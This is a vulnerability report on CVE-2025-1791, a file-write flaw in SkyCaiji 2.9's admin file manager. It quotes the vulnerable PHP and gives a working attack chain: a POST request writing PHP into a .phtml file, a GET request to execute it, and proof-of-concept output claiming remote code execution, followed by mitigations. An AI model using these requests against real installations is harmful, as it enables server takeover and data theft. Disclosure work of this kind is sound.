# CVE-2025-1791 Vulnerability Report

## Vulnerability Overview

- **CVE ID**: CVE-2025-1791
- **Affected Software**: Zorlan SkyCaiji 2.9
- **Vulnerability Type**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **Attack Vector**: Network (Remote)

## Vulnerability Description

A critical vulnerability exists in the `fileAction` function of `vendor/skycaiji/app/admin/controller/Tool.php`. The `save` operation uses `input('save_data','',null)` which completely disables input filtering, allowing arbitrary content to be written to files. Combined with the fact that only `.php` extension is blocked, attackers can write PHP code to `.phtml` files.

## Vulnerable Code

```php
}elseif($op=='save'){
    if($this->request->isPost()){
        if(preg_match('/\.php$/i', $filePath)){
            $this->error('禁止修改php文件');
        }
        // VULNERABLE: No filtering on save_data (third parameter is null)
        $saveData=input('save_data','',null);
        file_put_contents($filePath, $saveData);
        $this->success('已修改','');
    }
}
```

## Complete Attack Chain

### Step 1: File Localization Downloads .phtml File

SkyCaiji's "File Localization" feature automatically downloads remote files during collection, preserving original extensions:

```php
// ReleaseBase.php - File download preserves extension
$prop=\util\Funcs::get_url_suffix($url);
$filename=date('Y-m-d',time()).'/'.$key.$prop;
write_dir_file($filefull, $fileCodeInfo['html']);
```

### Step 2: Exploit save_data Vulnerability

Use file manager's `save` operation to write PHP code to the downloaded `.phtml` file:

```
POST /index.php/admin/tool/file?op=save&file=files/downloaded.phtml
Data: save_data=<?php echo "CVE-2025-1791_VULN_SUCCESS"; phpinfo(); ?>
```

### Step 3: Code Execution

Access the `.phtml` file to execute PHP code:

```
GET /data/files/downloaded.phtml
Response: CVE-2025-1791_VULN_SUCCESS + phpinfo() output
```

## Proof of Concept Results

```
[+] Login successful
[+] File manager enabled
[+] Found .phtml file(s): ['downloaded.phtml']
[*] Writing PHP code to files/downloaded.phtml
[+] Wrote PHP code to: files/downloaded.phtml
[+] VULNERABILITY CONFIRMED - PHP code executed!
[+] Shell URL: http://localhost:8085/data/files/downloaded.phtml
[+] phpinfo() executed successfully - Full RCE achieved!
```

## Impact

- Remote Code Execution (RCE)
- Complete server compromise
- Data theft and manipulation
- Lateral movement within network

## Mitigation

1. Filter `save_data` parameter content
2. Block all PHP-executable extensions: `.phtml`, `.php5`, `.php7`, `.phar`, etc.
3. Disable PHP execution in `data/` directory
4. Use whitelist for allowed file extensions

## References

- https://nvd.nist.gov/vuln/detail/CVE-2025-1791
- https://github.com/zorlan/skycaiji
